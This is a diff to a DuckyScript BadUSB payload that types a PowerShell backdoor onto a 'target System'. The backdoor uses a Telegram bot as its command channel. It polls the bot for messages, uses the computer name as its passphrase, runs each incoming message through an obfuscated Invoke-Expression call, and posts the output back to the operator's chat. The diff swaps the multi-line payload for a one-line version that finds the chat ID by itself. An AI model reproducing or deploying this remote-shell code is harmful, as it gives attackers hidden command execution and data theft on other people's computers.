@@ -10,12 +10,6 @@ REM 2. add bot api to script.
 REM 3. search for bot in top left box in telegram and start a chat then type /start.
 REM 4. add chat ID in 'CHAT_ID_HERE' for the chat bot (run this code below to find the chat id) 
 REM ---------------------------------------------------
-REM $token='YOUR_TOKEN_HERE' #Replace this with your bot Token
-REM $URL='https://api.telegram.org/bot{0}' -f $Token
-REM $inMessage=Invoke-RestMethod -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
-REM $inMessage.result.message | write-output
-REM $inMessage.result.message | get-member
-REM -----------------------------------------------------
 REM 5. Run Script on target System
 REM 6. Check telegram chat for 'waiting to connect' message.
 REM 7. this script has a feature to wait until you start the session from telegram.
@@ -35,24 +29,6 @@ DELAY 1500
 ALT y
 DELAY 4000
 
-STRING $Token = 'YOUR_TOKEN_HERE';$ChatID = "CHAT_ID_HERE";$PassPhrase = "$env:COMPUTERNAME";$URL='https://api.telegram.org/bot{0}' -f $Token ;$AccSesH="";$LastUmsg="";$LastmsgID="";sleep 1
-
-STRING ;$Mtsend = New-Object psobject ;$Mtsend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID;$Mtsend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Waiting to Connect.."
-STRING ;Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($Mtsend | ConvertTo-Json) -ContentType "application/json";Sleep 5
-STRING ;Function IsAuth{param($CheckMessage)if (($messages.message.date -ne $LastUmsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){$script:AccSesH="Authenticated"
-STRING ;$Mtsend = New-Object psobject ;$Mtsend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID;$Mtsend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Session Started."
-STRING ;Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($Mtsend | ConvertTo-Json) -ContentType "application/json";return $messages.message.chat.id}Else{return 0}}
-
-STRING ;Function StrmFX{param($Stream)$FixRslt=@()
-STRING ;$Stream | Out-File -FilePath (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") -Force;$ReadAsArray= Get-Content -Path (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") | where {$_.length -gt 0}
-STRING ;foreach ($line in $ReadAsArray){;$ArrObj=New-Object psobject;$ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring();$FixRslt +=$ArrObj}return $FixRslt}
-
-STRING ;Function stgmsg{param($Messagetext,$ChatID)$FixedText=StrmFX -Stream $Messagetext
-STRING ;$Mtsend = New-Object psobject ;$Mtsend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID;$Mtsend | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line
-STRING ;$JsonData=($Mtsend | ConvertTo-Json);Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"}
-STRING ;Function rtgmsg{try{$inMessage=Invoke-RestMethod -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop;return $inMessage.result[-1]}Catch{return "Fail"}}
-STRING ;Sleep 3;While ($true){sleep 2;$messages=rtgmsg;if($LastUmsg -like $null){$LastUmsg=$messages.message.date};if(!($AccSesH)){$CheckAuthentication=IsAuth -CheckMessage $messages}Else{
-STRING ;if(($CheckAuthentication -ne 0) -and ($messages.message.text -notlike $PassPhrase) -and ($messages.message.date -ne $LastmsgID)){try{$Result=ie`x($messages.message.text) -ErrorAction Stop;$Result
-STRING ;stgmsg -Messagetext $Result -ChatID $messages.message.chat.id}catch{stgmsg -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id}Finally{$LastmsgID=$messages.message.date}}}};sleep 5;exit
+STRING $Token = 'YOUR_TOKEN_HERE';$PassPhrase = "$env:COMPUTERNAME";$URL='https://api.telegram.org/bot{0}' -f $Token ;while($chatID.length -eq 0){$updates = Invoke-RestMethod -Uri ($url + "/getUpdates");if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1];if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}};Sleep 10}$AccSesH="";$LastUmsg="";$LastmsgID="";sleep 1;$Mtsend = New-Object psobject ;$Mtsend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID;$Mtsend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Waiting to Connect..";Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($Mtsend | ConvertTo-Json) -ContentType "application/json";Sleep 5;Function IsAuth{param($CheckMessage)if (($messages.message.date -ne $LastUmsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){$script:AccSesH="Authenticated";$Mtsend = New-Object psobject ;$Mtsend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID;$Mtsend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Session Started.";Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($Mtsend | ConvertTo-Json) -ContentType "application/json";return $messages.message.chat.id}Else{return 0}};Function StrmFX{param($Stream)$FixRslt=@();$Stream | Out-File -FilePath (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") -Force;$ReadAsArray= Get-Content -Path (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") | where {$_.length -gt 0};foreach ($line in $ReadAsArray){;$ArrObj=New-Object psobject;$ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring();$FixRslt +=$ArrObj}return $FixRslt};Function stgmsg{param($Messagetext,$ChatID)$FixedText=StrmFX -Stream $Messagetext;$Mtsend = New-Object psobject ;$Mtsend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID;$Mtsend | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line;$JsonData=($Mtsend | ConvertTo-Json);Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"};Function rtgmsg{try{$inMessage=Invoke-RestMethod -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop;return $inMessage.result[-1]}Catch{return "Fail"}};Sleep 3;While ($true){sleep 2;$messages=rtgmsg;if($LastUmsg -like $null){$LastUmsg=$messages.message.date};if(!($AccSesH)){$CheckAuthentication=IsAuth -CheckMessage $messages}Else{if(($CheckAuthentication -ne 0) -and ($messages.message.text -notlike $PassPhrase) -and ($messages.message.date -ne $LastmsgID)){try{$Result=ie`x($messages.message.text) -ErrorAction Stop;$Result;stgmsg -Messagetext $Result -ChatID $messages.message.chat.id}catch{stgmsg -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id}Finally{$LastmsgID=$messages.message.date}}}};sleep 5;exit
 
 ENTER
